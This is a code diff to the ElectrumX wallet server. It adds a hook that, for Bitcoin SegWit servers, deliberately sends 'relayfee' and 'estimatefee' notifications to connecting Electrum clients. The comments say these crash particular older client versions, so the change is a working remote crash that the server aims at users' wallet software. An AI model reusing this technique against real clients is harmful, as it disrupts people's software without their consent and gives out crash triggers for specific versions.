@@ -1119,6 +1119,7 @@ class ElectrumX(SessionBase):
         # that protocol version in unsupported.
         ptuple, client_min = util.protocol_version(
             protocol_version, self.PROTOCOL_MIN, self.PROTOCOL_MAX)
+        await self.maybe_attempt_to_crash_old_client(ptuple)
         if ptuple is None:
             if client_min > self.PROTOCOL_MIN:
                 self.logger.info(f'client requested future protocol version '
@@ -1130,6 +1131,9 @@ class ElectrumX(SessionBase):
         self.set_request_handlers(ptuple)
 
         return (electrumx.version, self.protocol_version_string())
+
+    async def maybe_attempt_to_crash_old_client(self, proto_ver):
+        return
 
     async def transaction_broadcast(self, raw_tx):
         '''Broadcast a raw transaction to the network.
@@ -1555,3 +1559,17 @@ class AuxPoWElectrumX(ElectrumX):
             height += 1
 
         return headers.hex()
+
+
+class BitcoinSegwitElectrumX(ElectrumX):
+
+    async def maybe_attempt_to_crash_old_client(self, proto_ver):
+        client_ver = util.protocol_tuple(self.client)
+        is_old_protocol = proto_ver is None or proto_ver <= (1, 2)
+        is_old_client = client_ver != (0,) and client_ver < (3, 2, 4)
+        if is_old_protocol and is_old_client:
+            self.logger.info(f'attempting to crash old client with version {self.client}')
+            # this can crash electrum client 2.6 <= v < 3.1.2
+            await self.send_notification('blockchain.relayfee', ())
+            # this can crash electrum client (v < 2.8.2) UNION (3.0.0 <= v < 3.3.0)
+            await self.send_notification('blockchain.estimatefee', ())
